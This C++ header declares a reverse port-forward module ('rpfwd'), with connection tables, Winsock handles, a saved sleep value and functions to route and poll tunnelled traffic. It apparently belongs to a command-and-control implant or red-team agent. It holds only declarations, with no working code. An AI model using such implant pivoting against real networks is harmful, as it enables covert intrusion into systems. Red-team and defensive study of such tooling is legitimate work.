#ifndef STARBURST_RPFWD_H
#define STARBURST_RPFWD_H

#include <macros.h>

#ifdef INCLUDE_CMD_RPFWD

#include <socks.h>

#define RPFWD_MAX_CONNECTIONS 64
#define RPFWD_RECV_BUF_SIZE  65536

namespace stardust { class instance; }

namespace starburst {

    struct RpfwdConnection {
        uint32_t  server_id;
        uintptr_t sock;
        bool      active;
        bool      connected;
    };

    struct RpfwdState {
        WsApis          ws;
        RpfwdConnection conns[RPFWD_MAX_CONNECTIONS];
        uint32_t        conn_count;
        bool            active;
        uint32_t        saved_sleep;
        HMODULE         h_ws2;
        char            target_host[256];
        uint16_t        target_port;
    };

    auto declfn rpfwd_init(
        _Inout_ stardust::instance& inst,
        _In_    const char* target_host,
        _In_    uint16_t    target_port
    ) -> bool;

    auto declfn rpfwd_destroy(
        _Inout_ stardust::instance& inst
    ) -> void;

    auto declfn rpfwd_route(
        _Inout_ stardust::instance& inst,
        _In_    uint32_t server_id,
        _In_    uint8_t* data,
        _In_    uint32_t data_len,
        _In_    bool     do_exit
    ) -> void;

    auto declfn rpfwd_poll(
        _Inout_ stardust::instance& inst
    ) -> void;
}

#endif // INCLUDE_CMD_RPFWD
#endif // STARBURST_RPFWD_H
